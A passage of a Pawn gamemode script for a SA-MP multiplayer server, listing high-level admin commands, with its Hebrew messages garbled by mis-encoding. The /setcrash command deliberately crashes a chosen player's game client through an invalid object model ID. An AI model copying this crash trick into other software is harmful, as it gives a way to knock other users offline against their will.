		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateVGarage(p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/createbar") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateBar(p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/pickup") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		new Float:p[3], m, File:f, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /pickup [model] :öåøú äùéîåù");
		m = strval(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreatePickupEx(m,2,p[0],p[1],p[2]);
		f = fopen(file_pickups,io_append);
		format(string,sizeof(string),"CreatePickupEx(%d,2,%.4f,%.4f,%.4f);\r\n",m,p[0],p[1],p[2]);
		fwrite(f,string);
		fclose(f);
		return 1;
	}
	if(equal(cmd,"/spassword") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /spassword [password] :öåøú äùéîåù");
		format(string,sizeof(string),"password %s",cmd);
		SendRconCommand(string);
		format(string,sizeof(string)," .%s ñéñîú äùøú ùåðúä ì",cmd);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(equal(cmd,"/loadfs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /loadfs [filterscript name] :öåøú äùéîåù");
		format(string,sizeof(string),"loadfs %s",cmd);
		SendRconCommand(string);
		format(string,sizeof(string)," -%s.amx ðéñéåï ìèòéðú äôéìèøñ÷øéôè-",cmd);
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/unloadfs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unloadfs [filterscript name] :öåøú äùéîåù");
		format(string,sizeof(string),"unloadfs %s",cmd);
		SendRconCommand(string);
		format(string,sizeof(string)," -%s.amx ðéñéåï ìäåøãú äôéìèøñ÷øéôè-",cmd);
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/reloadfs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /reloadfs [filterscript name] :öåøú äùéîåù");
		format(string,sizeof(string),"reloadfs %s",cmd);
		SendRconCommand(string);
		format(string,sizeof(string)," -%s.amx ðéñéåï ìäåøãú åèòéðú äôéìèøñ÷øéôè-",cmd);
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/setcrash") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new id, Float:p[3], o, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setcrash [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerPos(id,p[0],p[1],p[2]);
		o = CreatePlayerObject(id,11111111,p[0],p[1],p[2],0.0,0.0,0.0);
		DestroyPlayerObject(id,o);
		format(string,sizeof(string)," .%s ä÷øñú àú",GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/edituser") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new cmd2[256], id, set, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2))
		{
			SendClientMessage(playerid,white," /edituser [id/name] [key] :öåøú äùéîåù");
			SendClientMessage(playerid,white," keys: kills, deaths, level, hitman, clevel, klevel, dlevel");
			return 1;
		}
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"kills"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] kills [kills] :öåøú äùéîåù");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .îñôø äøéâåú ùâåé");
			format(string,sizeof(string)," .ì %d %s ùéðéú àú îñôø ääøéâåú ùì",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú îñôø ääøéâåú ùìê ì %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][kills] = set;
			if(playerinfo[id][logged]) fsetint(fuser(id),"Kills",set);
		}
		else if(equal(cmd2,"deaths"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] deaths [deaths] :öåøú äùéîåù");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .îñôø ôòîé îååú ùâåé");
			format(string,sizeof(string)," .ì %d %s ùéðéú àú îñôø ôòîé äîååú ùì",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú îñôø ôòîé äîååú ùìê ì %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][deaths] = set;
			if(playerinfo[id][logged]) fsetint(fuser(id),"Deaths",set);
		}
		else if(equal(cmd2,"level"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] level [new level] :öåøú äùéîåù");
			set = strval(cmd);
			if(set < 0 || set > 50) return SendClientMessage(playerid,red," .øîä ùâåéä");
			format(string,sizeof(string)," .ì %d %s ùéðéú àú äøîä ùì",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú äøîä ùìê ì %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][level] = set;
			if(playerinfo[id][logged]) fsetint(fuser(id),"Level",set);
		}
		else if(equal(cmd2,"hitman"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] hitman [amount] :öåøú äùéîåù");
			set = strval(cmd);
			if(set < 0 || set > 999999999) return SendClientMessage(playerid,red," .îñôø ëñó ùâåé");
			format(string,sizeof(string)," .ì %d$ %s ùéðéú àú äëñó ùùîå òì",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú äëñó ùùîå òìéê %d$",set);
			SendClientMessage(id,green,string);
			playerinfo[id][hitman] = set;
		}
		else if(equal(cmd2,"clevel"))
		{
			if(playerinfo[id][work] != work_cop) return SendClientMessage(playerid,red," .äùç÷ï äðáçø ìà ùåèø");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] clevel [cop level] :öåøú äùéîåù");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .øîä ùâåéä");
			format(string,sizeof(string)," .ì %d$ %s ùéðéú øîú äùåèø ùì",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú øîú äùåèø ùìê ì %d$",set);
			SendClientMessage(id,green,string);
			playerinfo[id][coplevel] = set;
		}
		else if(equal(cmd2,"klevel"))
		{
			if(playerinfo[id][work] != work_killer) return SendClientMessage(playerid,red," .äùç÷ï äðáçø ìà øåöç");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] klevel [killer level] :öåøú äùéîåù");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .øîä ùâåéä");
			format(string,sizeof(string)," .ì %d %s ùéðéú øîú äøåöç ùì",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú øîú äøåöç ùìê ì %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][killerlevel] = set;
		}
		else if(equal(cmd2,"dlevel"))
		{
			if(playerinfo[id][work] != work_doctor) return SendClientMessage(playerid,red," .äùç÷ï äðáçø ìà øåôà");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] dlevel [doctor level] :öåøú äùéîåù");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .øîä ùâåéä");
			format(string,sizeof(string)," .ì %d$ %s ùéðéú øîú äøåôà ùì",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú øîú äøåôà ùìê ì %d$",set);
			SendClientMessage(id,green,string);
			playerinfo[id][doctorlevel] = set;
		}
		else return SendClientMessage(playerid,red," .àôùøåú òøéëä ùâåéä");
		return 1;
	}
	if(equal(cmd,"/skyd") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /skyd [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetPlayerPos(id,6366.5625,-2109.0959,1800.0);
		format(string,sizeof(string)," .%s äùìéê ìîéí àú %s",GetName(id),GetName(playerid));
		SendClientMessageToAll(green,string);
		SendClientMessage(id,blue," (: !î÷ååéí ùàúä éåãò ìùçåú");
		return 1;
	}
	if(equal(cmd,"/sslap") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new id, Float:h, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sslap [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerArmour(id,h);
		if(h > 0.0) SetPlayerArmour2(id,h-50.0);
		else
		{
			SetPlayerArmour2(id,0.0);
			GetPlayerHealth(id,h);
			SetPlayerHealth2(id,h-50.0);
		}
		if(IsPlayerInAnyVehicle(id)) SetVehicleVelocity(GetPlayerVehicleID(id),0.0,0.0,20.0);
		else
		{
			GetPlayerPos(id,p[0],p[1],p[2]);
			SetPlayerPos(id,p[0],p[1],p[2]+20.0);
		}
		for(new a=0;a<10;a++)
		{
			PlayerPlaySound(playerid,1190,0.0,0.0,0.0);
			PlayerPlaySound(id,1190,0.0,0.0,0.0);
		}
		format(string,sizeof(string)," *** %s has been super slapped by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/fakedeath") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /fakedeath [id/name] [reason] :öåøú äùéîåù");
		new reason, id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), reason = !strlen(cmd) || !IsNumeric(cmd) ? 53 : strval(cmd);
		SendDeathMessage(playerid,id,reason);
		return 1;
	}
	if(equal(cmd,"/sayas") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new text[256], id;
		cmd = strtok(cmdtext,idx), text = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(text)) return SendClientMessage(playerid,white," /sayas [id/name] [text] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(text[0] == '/') command(id,text);
		else OnPlayerText(id,text);
		return 1;
	}
	if(equal(cmd,"/lucifer") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		cmd = strtok(cmdtext,idx);
		new string[M_S];
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /lucifer [cmd] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /lucifer me :äôéëä ìùèï");
			SendClientMessage(playerid,white," /lucifer end :äôñ÷ú îöá ùèï");
			SendClientMessage(playerid,white," /lucifer kill [id/name] :äøéâú ùç÷ï áëåç äùèï");
			SendClientMessage(playerid,white," /lucifer power [1-3] :ùéîåù áëåçåú ùèï àçøéí");
			return 1;
		}
		if(equal(cmd,"me"))
		{
			if(playerinfo[playerid][lucifer]) return SendClientMessage(playerid,red," .àúä ëáø ùèï");
			playerinfo[playerid][lucifer] = 1;
			SetWeather(8);
			SetWorldTime(23);
			SetPlayerHealth2(playerid,100000.0);
			playerinfo[playerid][gm] = 1, playerinfo[playerid][nr] = 1,
			playerinfo[playerid][abf][0] = 1, playerinfo[playerid][abf][1] = GetPlayerState(playerid) == PLAYER_STATE_DRIVER ? GetPlayerVehicleID(playerid) : INVALID_VEHICLE_ID;
			SetPlayerColor(playerid,rgba2hex(255,0,0,255));
			ResetWeapons(playerid);
			for(new i=0;i<sizeof(luciferWeapons);i++) GiveWeapon(playerid,luciferWeapons[i],100000);
			News(" !äùèï ééøã ìàøõ, äæäøå");
		}
		else if(equal(cmd,"end"))
		{
			if(!playerinfo[playerid][lucifer]) return SendClientMessage(playerid,red," .àúä ìà ùèï");
			playerinfo[playerid][lucifer] = 0;
			SetWeather(10);
			SetWorldTime(10);
			SetPlayerHealth2(playerid,100.0);
			playerinfo[playerid][gm] = 0, playerinfo[playerid][nr] = 0,
			playerinfo[playerid][abf][0] = 0, playerinfo[playerid][abf][1] = INVALID_VEHICLE_ID;
			SetPlayerColor(playerid,GetColor(playerid,153));
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,153));
			ResetWeapons(playerid);
			for(new i=0;i<10;i++) GiveWeapon(playerid,playerinfo[playerid][weapons][i],i == 9 || i == 8? 1:(GetAmmunationAmmo(playerinfo[playerid][weapons][i])*playerinfo[playerid][ammo][i]));
			News(" .àéæå ä÷ìä, äùèï çæø ìáéúå");
		}
		else if(equal(cmd,"kill"))
		{
			if(!playerinfo[playerid][lucifer]) return SendClientMessage(playerid,red," .àúä ìà ùèï");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /lucifer kill [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
			SetPlayerHealth2(id,0.0);
			format(string,sizeof(string)," !áòæøú ëåçåúéå %s äùèï äøâ àú",GetName(id));
			News(string);
		}
		else if(equal(cmd,"power"))
		{
			if(!playerinfo[playerid][lucifer]) return SendClientMessage(playerid,red," .àúä ìà ùèï");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /lucifer power [1-3] :öåøú äùéîåù");
				SendClientMessage(playerid,white," /lucifer power 1 :øòéãú àãîä");
				SendClientMessage(playerid,white," /lucifer power 2 :ùøéôä");
				SendClientMessage(playerid,white," /lucifer power 3 :ôéöåöéí ìëì îä ùîñáéá");
				return 1;
			}
			new powerid = strval(cmd), Float:p[3], Float:p2[3], Float:h;
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			switch(powerid)
			{
				case 1:
				{
					CreateExplosion(p[0],p[1],p[2] - 25.0,7,0.3);
					for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && GetDistanceBetweenPlayers(playerid,i) <= 65.0 && i != playerid)
					{
						GetPlayerPos(i,p2[0],p2[1],p2[2]);
						CreateExplosion(p2[0],p2[1],p2[2] - 30.0,7,0.3);
						GetPlayerHealth(i,h);
						SetPlayerHealth2(i,h - floatrand(1.0,10.0));
					}
					News(" !äùèï ééöø øòéãú àãîä");
				}
				case 2:
				{
					CreateExplosion(p[0],p[1],p[2]-10.0,7,0.3);
					for(new i = 0; i < 6; i++)
					{
						CreateExplosion(!random(2) ? p[0] + floatrand(15.0,30.0) : p[0] - floatrand(15.0,30.0),p[1],p[2],8,10);
						CreateExplosion(p[0],!random(2) ? p[1] + floatrand(15.0,30.0) : p[1] - floatrand(15.0,30.0),p[2],8,10);
					}
					News(" !äùèï ééöø ùøéôä");
				}
				case 3:
				{
					for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && GetDistanceBetweenPlayers(playerid,i) <= 80.0 && i != playerid)
					{
						GetPlayerPos(i,p[0],p[1],p[2]);
						CreateExplosion(p[0],p[1],p[2],1,10);
					}
					for(new i = 0; i < MAX_VEHICLES; i++) if(vehicleinfo[i][vvalid] && !IsPlayerInVehicle(playerid,i))
					{
						GetVehiclePos(i,p2[0],p2[1],p2[2]);
						if(DistanceToPoint(p[0],p[1],p[2],p2[0],p2[1],p2[2]) <= 80.0) CreateExplosion(p2[0],p2[1],p2[2],1,10);
					}
					for(new i = 0; i < max_objects; i++) if(IsValidSObject(i) && ObjectToPoint(object_show_distance,i,p[0],p[1],p[2]) && !ObjectToPoint(10.0,i,p[0],p[1],p[2]))
					{
						GetSObjectPos(i,p2[0],p2[1],p2[2]);
						CreateExplosion(p2[0],p2[1],p2[2],1,10);
					}
					News(" !äùèï ôéöõ àú ëì îä ùîñáéáå");
				}
				default: return SendClientMessage(playerid,red," .ëåç ùèï ùâåé");
			}
			format(string,sizeof(string)," .äùúîùú áëåç ä #%d ùìê",powerid);
			SendClientMessage(playerid,rgba2hex(255,255,255,255),string);
		}
		else return SendClientMessage(playerid,red," .àôùøåú ùèï ùâåéä");
		return 1;
	}
	if(equal(cmd,"/pgravity") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new text[256], id, Float:pgravity, string[M_S];
		cmd = strtok(cmdtext,idx), text = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(text)) return SendClientMessage(playerid,white," /pgravity [id/name] [gravity] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), pgravity = !strlen(cmd) ? 0.008 : floatstr(cmd);
		#if usingYSF
			//SetPlayerGravity(id,pgravity);
		#endif
		format(string,sizeof(string)," .ì %f %s ùéðéú ëåç äîùéëä àöì",pgravity,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú ëåç äîùéëä àöìê ì %f",pgravity);
		SendClientMessage(id,green,string);
		return 1;
	}
	if(equal(cmd,"/boomcar") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /boomcar [id/name] [on/off] :öåøú äùéîåù");
		new toggle = 1, id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), toggle = !equal(cmd,"off");
		playerinfo[id][boomcar] = toggle;
		SendClientMessage(playerid,green," Done.");
		SendClientMessage(id,red,toggle ? (" Are you ready to see some FIRE?!") : (" .úøâò, ìà úøàä òåã àù"));
		return 1;
	}
	if(equal(cmd,"/wehateyou") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /wehateyou [id/name] :öåøú äùéîåù");
		new string[M_S], id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .ééùðà úëó åîéã %s",GetName(id));
		SendClientMessage(id,red,string);
		format(string,sizeof(string)," .äçìéè ùöøéê ìùðåà àåúê %s äàãîéï",GetName(playerid));
		SendClientMessage(id,red,string);
		SendClientMessage(id,red," .áòåã 3 ùðéåú ðúçéì ìäòìéá àåúê åìäúòìì áê");
		playerinfo[playerid][wehateyou] = SetTimerEx("WeHateYou",3000,0,"i",id);
		SetPlayerHealth(id,0.0);
		return 1;
	}
	if(equal(cmd,"/smuslap") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		new id, Float:h, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /smuslap [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		GetPlayerArmour(id,h);
		if(h > 0.0) SetPlayerArmour2(id,h-99.0);
		else
		{
			SetPlayerArmour2(id,0.0);
			GetPlayerHealth(id,h);
			SetPlayerHealth2(id,h-99.0);
		}
		if(IsPlayerInAnyVehicle(id)) SetVehicleVelocity(GetPlayerVehicleID(id),0.0,0.0,500.0);
		else
		{
			GetPlayerPos(id,p[0],p[1],p[2]);
			SetPlayerPos(id,p[0],p[1],p[2]+500.0);
		}
		for(new a=0;a<50;a++)
		{
			PlayerPlaySound(playerid,1190,0.0,0.0,0.0);
			PlayerPlaySound(id,1190,0.0,0.0,0.0);
		}
		format(string,sizeof(string)," *** %s has been super mega ultra slapped by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/sdmuasslap") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 19");
		if(!playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .Amit Power òìéê ìäùúîù á");
		new id, Float:h, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sdmuasslap [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		GetPlayerArmour(id,h);
		if(h > 0.0) SetPlayerArmour2(id,h-99.0);
		else
		{
			SetPlayerArmour2(id,0.0);
			GetPlayerHealth(id,h);
			SetPlayerHealth2(id,h-99.0);
		}
		if(IsPlayerInAnyVehicle(id)) SetVehicleVelocity(GetPlayerVehicleID(id),0.0,0.0,1500.0);
		else
		{
			GetPlayerPos(id,p[0],p[1],p[2]);
			SetPlayerPos(id,p[0],p[1],p[2]+1500.0);
		}
		for(new a=0;a<100;a++)
		{
			PlayerPlaySound(playerid,1190,0.0,0.0,0.0);
			PlayerPlaySound(id,1190,0.0,0.0,0.0);
		}
		format(string,sizeof(string)," *** %s has been super duper mega ultra amazing splendid slapped by the Amit Power.",GetName(id));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,red,string);
		return 1;
	}
	if(equal(cmd,"/preset") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 20");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /preset [id/name] [1=bank / 2=vehicle / 3=house] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,red," .ìà ðáçø ãáø ìáéöåò");
		new wtd = strval(cmd);
		switch(wtd)
		{
			case 1:
			{
				// Reset bank
				playerinfo[id][bank] = 0;
				SendClientMessage(id,red," ~ øéñè ìëñó ááð÷");
			}
			case 2:
			{
				// Reset vehicle
				if(playerinfo[id][vehicle] != -1)
				{
					if(playerinfo[id][logged]) fsetint(fuser(id),"Vehicle",-1);
					format(string,sizeof(string),"Vehicle%d",playerinfo[id][vehicle]);
					fsetstring(file_vstore,string,"None");
					playerinfo[id][vehicle] = -1;
					SendClientMessage(id,red," ~ øéñè ìøëá ÷ðåé");
				}
			}
			case 3:
			{
				// Reset house
				if(playerinfo[id][houseid] != -1)
				{
					new f[M_S], h = playerinfo[id][house];
					format(f,sizeof(f),"/DM/Houses/%d.ini",h);
					fsetfloat(f,"X",houseinfo[h][hx]);
					fsetfloat(f,"Y",houseinfo[h][hy]);
					fsetfloat(f,"Z",houseinfo[h][hz]);
					fsetfloat(f,"A",0.0);
					for(new i=0;i<max_houseacc;i++)
					{
						format(string,sizeof(string),"Acc%d",i);
						if(fkeyexist(f,string)) fremovekey(f,string);
					}
					houseinfo[h][hp][0] = houseinfo[h][hx],
					houseinfo[h][hp][1] = houseinfo[h][hy],
					houseinfo[h][hp][2] = houseinfo[h][hz],
					houseinfo[h][hp][3] = 0.0;
					playerinfo[id][house] = -1,
					playerinfo[id][houseacc][h] = 0;
					playerinfo[id][inhouse] = -1;
					fsetstring(f,"Owner","None");
